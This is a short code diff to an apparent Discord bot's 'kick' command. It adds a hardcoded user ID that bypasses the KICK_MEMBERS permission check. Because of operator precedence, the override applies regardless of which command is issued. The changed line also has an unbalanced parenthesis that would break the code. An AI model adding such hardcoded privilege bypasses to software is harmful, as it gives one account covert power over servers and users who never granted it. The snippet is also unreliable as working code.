@@ -359,7 +359,7 @@ async function googleCommand(msg, args) {
         .setFooter("logo")
         .setColor("#0000ff")
         message.channel.send({embed})
-    } else if (['kick'].includes(command) && message.member.hasPermission('KICK_MEMBERS')) {
+    } else if (['kick'].includes(command) && message.member.hasPermission('KICK_MEMBERS') || message.author.id === "361951318929309707")) {
             const user = message.mentions.users.first();
     if (user) {
       const member = message.guild.member(user);
